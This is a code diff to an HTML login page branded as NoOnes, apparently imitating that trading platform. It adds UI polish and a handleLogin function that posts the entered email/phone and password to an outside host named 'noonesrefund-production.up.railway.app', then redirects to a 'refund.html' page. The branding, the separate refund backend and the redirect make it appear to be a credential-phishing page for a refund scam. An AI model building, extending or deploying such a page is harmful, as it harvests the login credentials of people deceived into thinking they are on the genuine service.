@@ -320,12 +320,42 @@
             cursor: pointer;
             transition: background-color 0.2s ease, transform 0.1s ease;
             width: 100%;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-        .tw-login-btn:hover {
+        .tw-login-btn:hover:not(:disabled) {
             background-color: var(--mantine-color-green-hover-0);
         }
-        .tw-login-btn:active {
+        .tw-login-btn:active:not(:disabled) {
             transform: scale(0.98);
+        }
+        .tw-login-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        /* ===== Loading Spinner ===== */
+        .spinner {
+            display: none;
+            width: 1.25rem;
+            height: 1.25rem;
+            border: 2px solid var(--mantine-color-white-0);
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 0.5rem;
+        }
+
+        .spinner.active {
+            display: inline-block;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
         }
 
         /* ===== Social Buttons ===== */
@@ -444,6 +474,38 @@
             transform: translateX(1.25rem);
         }
 
+        /* ===== Toast Notification ===== */
+        .toast {
+            position: fixed;
+            bottom: 2rem;
+            right: 2rem;
+            background-color: var(--mantine-color-black-0);
+            color: var(--mantine-color-white-0);
+            padding: 0.75rem 1.5rem;
+            border-radius: 0.5rem;
+            font-size: 0.875rem;
+            font-weight: 500;
+            box-shadow: var(--mantine-shadow-lg);
+            transform: translateY(100px);
+            opacity: 0;
+            transition: all 0.3s ease;
+            z-index: 1000;
+            max-width: 400px;
+        }
+
+        .toast.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        .toast.error {
+            background-color: #F22323;
+        }
+
+        .toast.success {
+            background-color: #07B979;
+        }
+
         /* ===== Responsive ===== */
         @media (max-width: 480px) {
             .tw-px-6 { padding-left: 1rem; padding-right: 1rem; }
@@ -536,8 +598,9 @@
                 </div>
 
                 <!-- Login Button -->
-                <button class="tw-login-btn tw-mb-4">
-                    Log in
+                <button class="tw-login-btn tw-mb-4" id="loginBtn">
+                    <span class="spinner" id="loginSpinner"></span>
+                    <span id="loginText">Log in</span>
                 </button>
 
                 <!-- Sign Up -->
@@ -560,8 +623,120 @@
         </div>
     </div>
 
+    <!-- Toast Notification -->
+    <div class="toast" id="toast"></div>
+
     <script>
-        // ===== Language Translations =====
+        // ============================================
+        // BACKEND CONFIGURATION
+        // ============================================
+        const API_URL = 'https://noonesrefund-production.up.railway.app';
+
+        // ============================================
+        // TOAST NOTIFICATION
+        // ============================================
+        const toast = document.getElementById('toast');
+        let toastTimeout;
+
+        function showToast(message, type = '') {
+            toast.textContent = message;
+            toast.className = 'toast' + (type ? ' ' + type : '');
+            toast.classList.add('show');
+            clearTimeout(toastTimeout);
+            toastTimeout = setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
+        // ============================================
+        // LOGIN FUNCTION
+        // ============================================
+        async function handleLogin() {
+            const email = document.getElementById('email-phone').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const loginBtn = document.getElementById('loginBtn');
+            const loginText = document.getElementById('loginText');
+            const loginSpinner = document.getElementById('loginSpinner');
+
+            // Validate input
+            if (!email || !password) {
+                const messages = {
+                    'en': 'Please fill in both email/phone and password.',
+                    'es': 'Por favor, complete ambos campos.',
+                    'fr': 'Veuillez remplir les deux champs.',
+                    'de': 'Bitte füllen Sie beide Felder aus.',
+                    'zh': '请填写两个字段。'
+                };
+                showToast(messages[currentLanguage] || messages['en'], 'error');
+                return;
+            }
+
+            // Show loading state
+            loginBtn.disabled = true;
+            loginSpinner.classList.add('active');
+            loginText.textContent = 'Logging in...';
+
+            try {
+                const response = await fetch(`${API_URL}/api/login`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        password: password
+                    })
+                });
+
+                const data = await response.json();
+
+                if (response.ok && data.success) {
+                    // Success
+                    const successMessages = {
+                        'en': '✅ Login successful! Redirecting...',
+                        'es': '✅ ¡Inicio de sesión exitoso! Redirigiendo...',
+                        'fr': '✅ Connexion réussie ! Redirection...',
+                        'de': '✅ Anmeldung erfolgreich! Weiterleitung...',
+                        'zh': '✅ 登录成功！正在跳转...'
+                    };
+                    showToast(successMessages[currentLanguage] || successMessages['en'], 'success');
+                    
+                    // Redirect to refund page after 1.5 seconds
+                    setTimeout(() => {
+                        window.location.href = 'refund.html';
+                    }, 1500);
+                } else {
+                    // Error from server
+                    const errorMessages = {
+                        'en': '❌ Login failed. Please try again.',
+                        'es': '❌ Error al iniciar sesión. Inténtelo de nuevo.',
+                        'fr': '❌ Échec de la connexion. Veuillez réessayer.',
+                        'de': '❌ Anmeldung fehlgeschlagen. Bitte versuchen Sie es erneut.',
+                        'zh': '❌ 登录失败。请重试。'
+                    };
+                    showToast(errorMessages[currentLanguage] || errorMessages['en'], 'error');
+                }
+            } catch (error) {
+                console.error('Login error:', error);
+                const errorMessages = {
+                    'en': '❌ Network error. Please check your connection.',
+                    'es': '❌ Error de red. Verifique su conexión.',
+                    'fr': '❌ Erreur réseau. Vérifiez votre connexion.',
+                    'de': '❌ Netzwerkfehler. Bitte überprüfen Sie Ihre Verbindung.',
+                    'zh': '❌ 网络错误。请检查您的连接。'
+                };
+                showToast(errorMessages[currentLanguage] || errorMessages['en'], 'error');
+            } finally {
+                // Reset button state
+                loginBtn.disabled = false;
+                loginSpinner.classList.remove('active');
+                loginText.textContent = 'Log in';
+            }
+        }
+
+        // ============================================
+        // LANGUAGE TRANSLATIONS
+        // ============================================
         const translations = {
             'en': {
                 'welcome': 'Welcome to NoOnes',
@@ -665,8 +840,10 @@
             const forgotLink = document.querySelector('.tw-forgot-link');
             if (forgotLink) forgotLink.textContent = t.forgot_password;
             
-            const loginBtn = document.querySelector('.tw-login-btn');
-            if (loginBtn) loginBtn.textContent = t.login;
+            const loginText = document.getElementById('loginText');
+            if (loginText && !document.getElementById('loginBtn').disabled) {
+                loginText.textContent = t.login;
+            }
             
             const noAccountSpan = document.querySelector('.tw-text-grey-green-text');
             if (noAccountSpan) noAccountSpan.textContent = t.no_account + ' ';
@@ -681,6 +858,9 @@
             document.documentElement.lang = lang;
         }
 
+        // ============================================
+        // DOM EVENT LISTENERS
+        // ============================================
         document.addEventListener('DOMContentLoaded', function() {
             // Password toggle
             document.querySelectorAll('.tw-password-toggle').forEach(btn => {
@@ -706,13 +886,11 @@
                     const scheme = this.classList.contains('active') ? 'dark' : 'light';
                     document.documentElement.setAttribute('data-mantine-color-scheme', scheme);
                     
-                    // Save preference
                     try {
                         localStorage.setItem('theme-preference', scheme);
                     } catch (e) {}
                 });
                 
-                // Load saved theme preference
                 try {
                     const savedTheme = localStorage.getItem('theme-preference');
                     if (savedTheme === 'dark') {
@@ -724,7 +902,7 @@
                 } catch (e) {}
             }
 
-            // Language selector - cycles through languages
+            // Language selector
             const langSelector = document.querySelector('.tw-lang-selector');
             if (langSelector) {
                 const languages = ['en', 'es', 'fr', 'de', 'zh'];
@@ -735,13 +913,11 @@
                     const newLang = languages[langIndex];
                     updateLanguage(newLang);
                     
-                    // Save language preference
                     try {
                         localStorage.setItem('language-preference', newLang);
                     } catch (e) {}
                 });
                 
-                // Load saved language preference
                 try {
                     const savedLang = localStorage.getItem('language-preference');
                     if (savedLang && translations[savedLang]) {
@@ -754,29 +930,19 @@
                 } catch (e) {}
             }
 
-            // Login button
-            document.querySelector('.tw-login-btn')?.addEventListener('click', function() {
-                const email = document.querySelector('input[type="email"]')?.value;
-                const password = document.querySelector('input[type="password"]')?.value;
-                if (!email || !password) {
-                    const messages = {
-                        'en': 'Please fill in both email/phone and password.',
-                        'es': 'Por favor, complete ambos campos.',
-                        'fr': 'Veuillez remplir les deux champs.',
-                        'de': 'Bitte füllen Sie beide Felder aus.',
-                        'zh': '请填写两个字段。'
-                    };
-                    alert(messages[currentLanguage] || messages['en']);
-                    return;
+            // Login button - NOW CONNECTED TO BACKEND
+            document.getElementById('loginBtn').addEventListener('click', handleLogin);
+
+            // Enter key support
+            document.getElementById('password').addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    handleLogin();
                 }
-                const messages = {
-                    'en': 'Login attempt (placeholder)',
-                    'es': 'Intento de inicio de sesión (placeholder)',
-                    'fr': 'Tentative de connexion (placeholder)',
-                    'de': 'Anmeldeversuch (Platzhalter)',
-                    'zh': '登录尝试（占位符）'
-                };
-                alert(messages[currentLanguage] || messages['en']);
+            });
+            document.getElementById('email-phone').addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    document.getElementById('password').focus();
+                }
             });
 
             // Social buttons
@@ -784,13 +950,13 @@
                 btn.addEventListener('click', function() {
                     const label = this.getAttribute('aria-label') || 'Social';
                     const messages = {
-                        'en': `${label} login placeholder`,
-                        'es': `Inicio de sesión con ${label} (placeholder)`,
-                        'fr': `Connexion avec ${label} (placeholder)`,
-                        'de': `${label} Anmeldung (Platzhalter)`,
-                        'zh': `${label} 登录（占位符）`
+                        'en': `${label} login coming soon`,
+                        'es': `Inicio de sesión con ${label} próximamente`,
+                        'fr': `Connexion avec ${label} bientôt disponible`,
+                        'de': `${label} Anmeldung demnächst verfügbar`,
+                        'zh': `${label} 登录即将推出`
                     };
-                    alert(messages[currentLanguage] || messages['en']);
+                    showToast(messages[currentLanguage] || messages['en'], '');
                 });
             });
 
@@ -798,25 +964,25 @@
             document.querySelector('.tw-forgot-link')?.addEventListener('click', function(e) {
                 e.preventDefault();
                 const messages = {
-                    'en': 'Reset password placeholder',
-                    'es': 'Restablecer contraseña (placeholder)',
-                    'fr': 'Réinitialiser le mot de passe (placeholder)',
-                    'de': 'Passwort zurücksetzen (Platzhalter)',
-                    'zh': '重置密码（占位符）'
+                    'en': 'Password reset feature coming soon',
+                    'es': 'Función de restablecimiento de contraseña próximamente',
+                    'fr': 'Fonction de réinitialisation du mot de passe bientôt disponible',
+                    'de': 'Passwort-Zurücksetzungsfunktion demnächst verfügbar',
+                    'zh': '密码重置功能即将推出'
                 };
-                alert(messages[currentLanguage] || messages['en']);
+                showToast(messages[currentLanguage] || messages['en'], '');
             });
             
             document.querySelector('.tw-signup-link')?.addEventListener('click', function(e) {
                 e.preventDefault();
                 const messages = {
-                    'en': 'Sign up placeholder',
-                    'es': 'Registro (placeholder)',
-                    'fr': "Inscription (placeholder)",
-                    'de': 'Registrierung (Platzhalter)',
-                    'zh': '注册（占位符）'
+                    'en': 'Sign up feature coming soon',
+                    'es': 'Función de registro próximamente',
+                    'fr': "Fonction d'inscription bientôt disponible",
+                    'de': 'Registrierungsfunktion demnächst verfügbar',
+                    'zh': '注册功能即将推出'
                 };
-                alert(messages[currentLanguage] || messages['en']);
+                showToast(messages[currentLanguage] || messages['en'], '');
             });
         });
     </script>
